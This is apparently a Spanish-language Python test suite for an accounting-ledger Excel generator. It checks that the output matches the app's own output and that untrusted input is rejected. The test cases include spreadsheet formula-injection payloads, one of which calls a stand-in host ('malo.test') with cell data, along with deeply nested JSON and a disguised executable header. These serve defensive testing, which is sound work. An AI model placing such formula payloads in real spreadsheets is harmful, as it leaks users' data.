"""T3 · `libro.generar` (página del contador, ADR-026): mismo Excel que el camino HTTP de la app en un PC vacío + entradas no confiables (S2).
Datos sintéticos de web/pruebas/datos/ (crudo_v1.json fijo = contrato R5; el extracto se arma en memoria)."""
import io, json, pathlib, sys, tempfile, time
from openpyxl import load_workbook
from parser_module.contable import libro

fallos = []
def chk(cond, msg):
    print(("✓ " if cond else "✗ ") + msg)
    if not cond: fallos.append(msg)

AQUI = pathlib.Path(__file__).parent
DATOS = AQUI / "web" / "pruebas" / "datos"
sys.path.insert(0, str(DATOS))
from generar import extracto_xlsx, FILAS_EXTRACTO   # noqa: E402
CRUDO, EXT = (DATOS / "crudo_v1.json").read_bytes(), extracto_xlsx()
NEG, NIT, AHORA = "Restaurante de Prueba SAS", "900.123.456-7", "2026-10-26T09:30:00"


def celdas(xlsx: bytes) -> dict:
    "Cada celda con valor y formato (R1: «valor y formato»), más las celdas combinadas y el orden de hojas."
    wb = load_workbook(io.BytesIO(xlsx))
    out = {"hojas": wb.sheetnames}
    for ws in wb:
        out[(ws.title, "merged")] = sorted(str(r) for r in ws.merged_cells.ranges)
        for fila in ws.iter_rows():
            for c in fila:
                if c.value is None and not c.has_style: continue
                out[(ws.title, c.coordinate)] = (c.value, c.number_format, c.font.b, c.font.color.rgb if c.font.color else None, c.fill.fgColor.rgb, c.alignment.horizontal)
    return out


def distintas(a: bytes, b: bytes) -> list:
    x, y = celdas(a), celdas(b)
    return [k for k in sorted(set(x) | set(y), key=str) if x.get(k) != y.get(k)]


# --- camino de la app: PC vacío → importar crudo → subir extracto → bajar Excel ---
import app as appmod   # noqa: E402
def app_excel(crudo: bytes, extracto: bytes | None) -> bytes:
    t = pathlib.Path(tempfile.mkdtemp())
    appmod.RUTA_LIBRO, appmod.RUTA_EXT_MEM, appmod.RUTA_SOPORTE, appmod.RUTA_CONT = t / "libro.json", t / "m.json", t / "soporte.db", t / "contable.json"
    appmod.RUTA_CONT.write_text(json.dumps(dict(negocio=NEG, nit=NIT)), encoding="utf8")
    cli = appmod.app.test_client()
    r = cli.post("/api/contable/crudo", data={"archivo": (io.BytesIO(crudo), "c.json")}, content_type="multipart/form-data")
    assert r.status_code == 200 and r.get_json()["nuevos"], r.get_json()
    if extracto:
        r = cli.post("/api/contable/extracto", data={"archivo": (io.BytesIO(extracto), "e.xlsx")}, content_type="multipart/form-data")
        assert r.status_code == 200, r.get_json()
    return cli.get("/api/contable/excel").data


g = libro.generar(CRUDO, None, None, NEG, NIT, AHORA)
chk(set(g) == {"xlsx", "nombre", "invalidos", "extracto"} and g["nombre"] == "reporte_contable_20261026.xlsx" and g["invalidos"] == [] and g["extracto"] is None,
    f"R1: generar devuelve xlsx + reporte_contable_<AAAAMMDD>.xlsx, sin inválidos ni extracto: {g['nombre']}")
d = distintas(g["xlsx"], app_excel(CRUDO, None))
chk(not d, f"R1: solo crudo → 0 celdas distintas frente a la app (importar + Excel): {d[:5]}")
wb = load_workbook(io.BytesIO(g["xlsx"]))
chk(len(wb.sheetnames) == 5, f"R1: el Excel trae 5 hojas: {wb.sheetnames}")
chk(any(c.value == NEG for ws in wb for f in ws.iter_rows() for c in f) and any(c.value == f"NIT {NIT}" for ws in wb for f in ws.iter_rows() for c in f),
    "R4: negocio y NIT salen en el encabezado")

t0 = time.time(); ge = libro.generar(CRUDO, EXT, None, NEG, NIT, AHORA); seg = time.time() - t0
d = distintas(ge["xlsx"], app_excel(CRUDO, EXT))
chk(not d, f"R2: crudo + extracto → 0 celdas distintas frente a la app (importar + subir extracto + Excel): {d[:5]}")
chk(ge["extracto"]["nuevas"] == len(FILAS_EXTRACTO) and ge["extracto"]["dias_creados"] == ["2026-09-18", "2026-09-30"],
    f"R2: las {len(FILAS_EXTRACTO)} líneas entran y crean los días que el crudo no trae: {ge['extracto']}")
chk(ge["xlsx"] != g["xlsx"] and distintas(ge["xlsx"], g["xlsx"]), "R2: el extracto sí cambia el Excel")
chk(distintas(libro.generar(CRUDO, EXT, None, NEG, NIT, AHORA)["xlsx"], ge["xlsx"]) == [], "determinista: dos corridas con el mismo `ahora` dan las mismas celdas")
chk(seg < 10, f"NFR: generar un crudo + extracto tarda {seg:.2f} s (≤ 10 s)")
gm = libro.generar(CRUDO, EXT, json.dumps({"memoria": {"PROVEEDOR EJEMPLO SAS": "51953001"}, "importaciones": {}}).encode(), NEG, NIT, AHORA)
chk(gm["extracto"]["por_revisar"] < ge["extracto"]["por_revisar"], f"R8: la memoria baja las líneas por revisar ({ge['extracto']['por_revisar']} → {gm['extracto']['por_revisar']})")
chk(libro.generar(CRUDO, b"", None, "", "", AHORA)["extracto"] is None, "extracto vacío = sin extracto; negocio/NIT vacíos se aceptan")


# --- S2: entradas no confiables → EntradaInvalida en español, sin traza ni rutas ---
def falla(**kw):
    a = dict(crudo=CRUDO, extracto=None, memoria=None, negocio=NEG, nit=NIT, ahora=AHORA) | kw
    try: libro.generar(**a); return None
    except libro.EntradaInvalida as e: return str(e)
    except Exception as e: return f"OTRA EXCEPCIÓN {type(e).__name__}: {e}"   # noqa: BLE001  S2: ninguna otra debe salir

from parser_module.contable.exportar import huella   # noqa: E402
j = json.loads(CRUDO)
def crudo_con(**k): return json.dumps(j | k).encode()
def _xlsx_sin_columnas():
    from openpyxl import Workbook
    wb = Workbook(); wb.active.append(["Fecha", "Monto"]); b = io.BytesIO(); wb.save(b); return b.getvalue()
casos = {
    "versión ≠ 1": falla(crudo=crudo_con(version=2)),
    "sha256 malo": falla(crudo=crudo_con(sha256="0" * 64)),
    "JSON roto": falla(crudo=CRUDO[: len(CRUDO) // 2]),
    "anidado 10⁴": falla(crudo=b"[" * 10000 + b"]" * 10000),
    "objeto anidado 10⁴": falla(crudo=b'{"a":' * 10000 + b"1" + b"}" * 10000),
    "anidado 10⁶": falla(crudo=b"[" * 10**6 + b"]" * 10**6),
    "otro formato": falla(crudo=b'{"formato": "otra-cosa"}'),
    "no UTF-8": falla(crudo=b"\xff\xfe\x00basura"),
    "crudo gigante": falla(crudo=b" " * (libro.MAX_CRUDO + 1)),
    "crudo vacío": falla(crudo=b""),
    "crudo no bytes": falla(crudo="texto"),
    "sin días": falla(crudo=crudo_con(dias=[], sha256=huella([]))),
    "NIT con fórmula =": falla(nit="=HYPERLINK(\"http://x\")"),
    "NIT corto con fórmula =": falla(nit="=1+1"),
    "NIT con letras": falla(nit="900ABC"),
    "NIT con +": falla(nit="+57"),
    "negocio con fórmula =": falla(negocio="=1+1"),
    "negocio con @": falla(negocio="@SUM(A1)"),
    "negocio con control": falla(negocio="Neg\x00ocio"),
    "negocio larguísimo": falla(negocio="x" * 500),
    "negocio no texto": falla(negocio=123),
    "extracto gigante": falla(extracto=b"0" * (libro.MAX_EXTRACTO + 1)),
    "extracto no es xlsx (.exe renombrado)": falla(extracto=b"MZ\x90\x00" + b"\x00" * 500),
    "extracto sin columnas": falla(extracto=_xlsx_sin_columnas()),
    "extracto no bytes": falla(extracto="hola"),
    "memoria gigante": falla(memoria=b" " * (libro.MAX_MEMORIA + 1)),
    "memoria JSON roto": falla(memoria=b"{"),
    "memoria anidada 10⁴": falla(memoria=b"[" * 10000 + b"]" * 10000),
    "memoria lista": falla(memoria=b"[]"),
    "memoria cuenta mala": falla(memoria=b'{"memoria": {"X": "=1+1"}}'),
    "ahora mal": falla(ahora="ayer"),
}
for nombre, m in casos.items():
    chk(m is not None and not m.startswith("OTRA") and "Traceback" not in m and "\\" not in m and ".py" not in m, f"S2 {nombre}: {m}")
chk("versión 2" in casos["versión ≠ 1"] and "sha256" in casos["sha256 malo"] and "20 MB" in casos["crudo gigante"] and "5 MB" in casos["extracto gigante"],
    "S2: el motivo dice qué pasó (versión, huella, tamaño)")

# un día malo no tumba los demás (R7 / R10 de ADR-004)
dias = j["dias"] + [dict(j["dias"][0], fecha="2026-02-30")]
h = huella(dias)
gi = libro.generar(crudo_con(dias=dias, sha256=h), None, None, NEG, NIT, AHORA)
chk([x["fecha"] for x in gi["invalidos"]] == ["2026-02-30"] and not distintas(gi["xlsx"], g["xlsx"]), f"R7: un día inválido se lista y el resto sale igual: {gi['invalidos']}")

# 6-test · S2 (CWE-1236): un crudo armado con fórmulas en cada texto libre no deja ninguna fórmula activa en el Excel
MAL = '=HYPERLINK("http://malo.test/?x="&A1,"ver")'
dias = json.loads(json.dumps(j["dias"]))
for d in dias:
    for doc in d["documentos"]:
        for k, v in doc.items():
            if isinstance(v, str) and k not in ("fecha", "id", "tipo", "cuenta", "medio", "dup_de"): doc[k] = MAL
wb = load_workbook(io.BytesIO(libro.generar(crudo_con(dias=dias, sha256=huella(dias)), None, None, NEG, NIT, AHORA)["xlsx"]))
activas = [f"{ws.title}!{c.coordinate}" for ws in wb for fila in ws.iter_rows() for c in fila if c.data_type == "f" and "malo.test" in str(c.value)]
como_texto = sum(1 for ws in wb for fila in ws.iter_rows() for c in fila if c.data_type == "s" and "malo.test" in str(c.value))
chk(como_texto > 0 and not activas, f"S2: fórmulas del crudo quedan como texto ({como_texto} celdas), activas: {activas[:3]}")

print(f"\n{'OK' if not fallos else f'{len(fallos)} FALLOS'}")
sys.exit(1 if fallos else 0)
